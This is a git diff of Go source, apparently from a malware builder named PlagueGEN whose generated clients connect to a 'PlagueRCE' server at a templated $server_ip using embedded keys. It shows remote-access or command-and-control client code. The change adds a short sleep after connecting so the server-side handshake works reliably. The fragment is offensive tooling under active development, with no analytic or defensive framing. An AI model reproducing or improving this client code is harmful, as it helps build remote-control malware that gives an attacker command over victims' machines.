@@ -26,6 +26,7 @@ import (
 	"packages/PlagueGEN/Code/packages" // Import my local packages
 	"runtime"
 	"strings"
+    "time"
 )
 
 func main() {
@@ -42,12 +43,12 @@ $private_key
 	var formatted_public_key string = strings.TrimSpace(public_key)
 	var formatted_private_key string = strings.TrimSpace(private_key)
 	
-
 	const server_address string = "$server_ip" // Server TCP/IP address
 	const OSinfo string = runtime.GOOS                  // Get operating system information
 
 	// Connect to PlagueRCE server
 	conn, _ := packages.ConnectToServer(server_address)
+    time.Sleep(2 * time.Second) // Prevent server side race condition
 
 	// Create a channel to notify the handler about the updated connection
 	var conn_update chan *net.Conn = make(chan *net.Conn)
@@ -77,6 +78,7 @@ import (
     "net"
     "packages/PlagueGEN/Code/packages" // Import my local packages
     "runtime"
+    "time"
 )
 
 func main() {
@@ -85,6 +87,7 @@ func main() {
 
     // Connect to PlagueRCE server
     conn, _ := packages.ConnectToServer(server_address)
+    time.Sleep(2 * time.Second) // Prevent server side race condition
 
     // Create a channel to notify the handler about the updated connection
     var conn_update chan *net.Conn = make(chan *net.Conn)
